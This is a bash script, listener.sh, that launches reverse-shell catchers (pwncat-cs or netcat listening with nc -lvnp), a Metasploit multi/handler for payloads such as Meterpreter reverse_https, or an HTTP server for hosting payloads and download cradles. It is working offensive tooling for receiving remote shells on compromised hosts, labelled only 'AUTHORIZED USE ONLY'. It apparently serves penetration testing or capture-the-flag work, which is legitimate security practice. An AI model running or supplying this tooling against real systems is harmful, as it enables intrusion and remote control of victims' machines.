#!/usr/bin/env bash
#
# listener.sh - quick reverse-shell / handler launcher
# -----------------------------------------------------------------------------
# One command to stand up whatever catcher you need:
#   - default : best available raw catcher (pwncat-cs > rlwrap nc > nc)
#   - -m      : Metasploit multi/handler for a given payload (LHOST/LPORT)
#   - -w      : a quick HTTP file server (to host payloads / cradles)
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./listener.sh -p <LPORT>                         # raw catcher
#   ./listener.sh -m -P <payload> -l <LHOST> -p <LPORT>   # msf handler
#   ./listener.sh -w [-p <PORT>] [-D <dir>]          # http server for payloads
#
# EXAMPLES:
#   ./listener.sh -p 443
#   ./listener.sh -m -P windows/x64/meterpreter/reverse_https -l 10.10.14.3 -p 443
#   ./listener.sh -w -p 8000 -D /opt/data/hackathon
#
# DEPENDENCIES: nc / rlwrap / pwncat-cs (raw) ; msfconsole (-m) ; python3 (-w)
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
have(){ command -v "$1" >/dev/null 2>&1; }

MODE="raw" LHOST="" LPORT="" PAYLOAD="" DIR="."
usage(){ sed -n '2,26p' "$0"; exit 1; }
while getopts "p:l:P:D:mwh" o; do case "$o" in
  p) LPORT=$OPTARG;; l) LHOST=$OPTARG;; P) PAYLOAD=$OPTARG;; D) DIR=$OPTARG;;
  m) MODE="msf";; w) MODE="web";; *) usage;;
esac; done

case "$MODE" in
  web)
    LPORT=${LPORT:-8000}
    have python3 || { c_err "python3 needed"; exit 1; }
    c_ok "HTTP server on :$LPORT serving $DIR  (Ctrl-C to stop)"
    exec python3 -m http.server "$LPORT" --directory "$DIR";;
  msf)
    [ -z "$PAYLOAD" ] || [ -z "$LHOST" ] || [ -z "$LPORT" ] && { c_err "msf mode needs -P, -l, -p"; usage; }
    have msfconsole || { c_err "msfconsole not found"; exit 1; }
    c_ok "Metasploit handler: $PAYLOAD on $LHOST:$LPORT"
    exec msfconsole -q -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j";;
  raw)
    [ -z "$LPORT" ] && { c_err "need -p <port>"; usage; }
    if have pwncat-cs; then c_ok "pwncat-cs catcher on :$LPORT (auto-upgrades shell)"; exec pwncat-cs -l -p "$LPORT"
    elif have rlwrap && have nc; then c_ok "rlwrap nc on :$LPORT"; exec rlwrap nc -lvnp "$LPORT"
    elif have nc; then c_ok "nc on :$LPORT"; exec nc -lvnp "$LPORT"
    else c_err "no pwncat-cs / nc available"; exit 1; fi;;
esac
